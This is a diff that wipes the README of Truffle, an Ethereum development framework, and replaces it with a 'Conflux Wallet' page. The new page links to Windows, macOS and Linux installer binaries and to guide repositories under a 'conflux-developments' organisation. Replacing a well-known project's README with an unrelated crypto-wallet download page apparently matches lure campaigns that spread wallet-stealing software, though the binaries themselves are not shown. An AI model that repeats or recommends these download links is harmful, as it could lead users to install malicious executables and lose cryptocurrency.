@@ -1,84 +1,72 @@
-<img src="https://truffleframework.com/img/truffle-logo-dark.svg" width="200">
+![Conflux Wallet](assets/banner-profile.png)
 
-[![npm](https://img.shields.io/npm/v/truffle.svg)](https://www.npmjs.com/package/truffle)
-[![npm](https://img.shields.io/npm/dm/truffle.svg)](https://www.npmjs.com/package/truffle)
-[![Join the chat at https://gitter.im/consensys/truffle](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/consensys/truffle?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
-[![Join the community on Spectrum](https://withspectrum.github.io/badge/badge.svg)](https://spectrum.chat/trufflesuite/truffle)
-[![Build Status](https://travis-ci.org/trufflesuite/truffle.svg)](https://travis-ci.org/trufflesuite/truffle)
-[![Coverage Status](https://coveralls.io/repos/github/trufflesuite/truffle/badge.svg)](https://coveralls.io/github/trufflesuite/truffle)
+<h1 align="center">Conflux Wallet</h1>
 
------------------------
+<p align="center">One window for both Conflux spaces, so a send starts from the right address.</p>
 
+<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>
 
-Truffle is a development environment, testing framework and asset pipeline for Ethereum, aiming to make life as an Ethereum developer easier. With Truffle, you get:
+---
 
-* Built-in smart contract compilation, linking, deployment and binary management.
-* Automated contract testing with Mocha and Chai.
-* Configurable build pipeline with support for custom build processes.
-* Scriptable deployment & migrations framework.
-* Network management for deploying to many public & private networks.
-* Interactive console for direct contract communication.
-* Instant rebuilding of assets during development.
-* External script runner that executes scripts within a Truffle environment.
+## Downloads - v0.6.14
 
-| ℹ️ **Contributors**: Please see the [Development](#development) section of this README. |
-| --- |
+<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>
 
-### Install
+<div align="center">
 
-```
-$ npm install -g truffle
-```
+| Platform | Requirements | File |
+|---|---|---|
+| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
+| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
+| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |
 
-### Quick Usage
+</div>
 
-For a default set of contracts and tests, run the following within an empty project directory:
+All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).
 
-```
-$ truffle init
-```
+> Only download from this GitHub release page.
 
-From there, you can run `truffle compile`, `truffle migrate` and `truffle test` to compile your contracts, deploy those contracts to the network, and run their associated unit tests.
+---
 
-Truffle comes bundled with a local development blockchain server that launches automatically when you invoke the commands  above. If you'd like to [configure a more advanced development environment](https://truffleframework.com/docs/advanced/configuration) we recommend you install the blockchain server separately by running `npm install -g ganache-cli` at the command line.
+## Why Conflux Wallet on js-conflux-sdk
 
-+  [ganache-cli](https://github.com/trufflesuite/ganache-cli): a command-line version of Truffle's blockchain server.
-+  [ganache](https://truffleframework.com/ganache/): A GUI for the server that displays your transaction history and chain state.
+A transaction on Conflux begins with a question that most wallets leave you to answer from memory: which space is this address in? Core Space uses `cfx:` base32 addresses, eSpace uses `0x` hex, and the same phrase produces a different account in each. Send to the wrong one and the transfer does not fail politely; it goes somewhere you cannot reach from the account you are looking at.
 
+Conflux Wallet answers that question on screen. The active space is labelled, the address is drawn in the format that belongs to it, and the balance shown is the balance of the account you are actually in. When a transfer is refused, the wallet usually tells you why in the space or the format rather than in the fee.
 
-### Documentation
+- Core Space and eSpace accounts kept separate, with separate balances and history.
+- Addresses shown in `cfx:` or `0x` form according to the space you are in.
+- A wrong-network or wrong-format send is visible before you confirm it.
+- The same recovery phrase restores both accounts, in the right space, on any machine.
 
-Please see the [Official Truffle Documentation](https://truffleframework.com/docs/) for guides, tips, and examples.
+This repository sits alongside the wallet's own pages; the guides that walk through space and address problems are linked at the end.
 
-### Development
+---
 
-We welcome pull requests. To get started, just fork this repo, clone it locally, and run:
+## Guides
 
-```shell
-# Install
-npm install -g yarn
-yarn bootstrap
+<div align="center">
 
-# Test
-yarn test
+| Guide | What it covers |
+|---|---|
+| [Core Space vs eSpace](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md) | Core Space vs eSpace: the checks, in order, for the current desktop release. |
+| [Conflux Address Formats](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-address-formats-cfx-vs-0x.md) | Conflux Address Formats: the checks, in order, for the current desktop release. |
+| [CFX Sent to the Wrong Network](https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-cfx-wrong-network.md) | CFX Sent to the Wrong Network: the checks, in order, for the current desktop release. |
 
-# Adding dependencies to a package
-cd packages/<truffle-package>
-yarn add <npm-package> [--dev] # Use yarn
-```
+</div>
 
-If you'd like to update a dependency to the same version across all packages, you might find [this utility](https://www.npmjs.com/package/lerna-update-wizard) helpful.
+[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
 
-*Notes on project branches:*
-+    `master`: Stable, released version (v5)
-+    `beta`: Released beta version
-+    `develop`: Work targeting stable release (v5)
-+    `next`: Upcoming feature development and most new work
+---
 
-Please make pull requests against `next` for any substantial changes. Small changes and bugfixes can be considered for `develop`.
+**Security:** download only from this release page, and never share a recovery phrase, private key, password or keystore file with anyone, including support.
 
-There is a bit more information in the [CONTRIBUTING.md](./CONTRIBUTING.md) file.
+## Support
 
-### License
+Wallet help: support@confluxwallet.net. Business and legal: office@confluxwallet.net.
+
+## License
 
 MIT
+
+[Main application](https://github.com/conflux-developments/conflux-desktop-wallet) - [Release v0.6.14](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) - [Guide index](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
